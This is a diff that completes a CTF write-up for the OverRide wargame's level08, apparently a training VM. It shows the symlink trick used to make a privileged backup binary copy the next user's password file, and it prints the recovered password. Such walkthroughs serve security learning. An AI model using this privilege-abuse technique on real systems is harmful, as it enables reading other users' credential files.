@@ -2,7 +2,7 @@
 
 ## Vulnerability
 
-
+Binary backs up password via symlink
 
 ## Context
 
@@ -17,24 +17,40 @@ level08@OverRide:~$ ls -la backups/
 -rwxrwx---+ 1 level09 users     0 Oct 19  2016 .log
 ```
 
-When run without arguments its prints ```Usage: ./level08 filename```. When run with a file as argument it prints ```ERROR: Failed to open``` and exits.
+When run without arguments its prints ```Usage: ./level08 filename```.
 ```
 level08@OverRide:~$ ./level08
 Usage: ./level08 filename
-ERROR: Failed to open (null)
-level08@OverRide:~$ ./level08 backups/.log
-ERROR: Failed to open ./backups/backups/.log
-level08@OverRide:~$
+```
+
+When run with a file as argument it copies the file to the ```./backups/``` folder.
+```
+level08@OverRide:~$ chmod 777 .
+level08@OverRide:~$ echo "oh hi" > hi
+level08@OverRide:~$ ./level08 hi
+level08@OverRide:~$ cat backups/hi
+oh hi
+```
+
+It also creates a log of the backup
+```
+level08@OverRide:~$ cat backups/.log
+LOG: Starting back up: hi
+LOG: Finished back up hi
 ```
 
 ## Solution
 
+Can we simply backup the password?
+```
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+```
 
-
-### Build exploit
-
-
-
-## Recreate Exploited Binary
-
-
+No, because it doesn't deal with files inside directories. So, in the home directory, lets create a symlink to the password. Now we can run the binary on the symlink, and it creates a backup of the password.
+```
+level08@OverRide:~$ ln -s /home/users/level09/.pass password
+level08@OverRide:~$ ./level08 password
+level08@OverRide:~$ cat backups/password
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
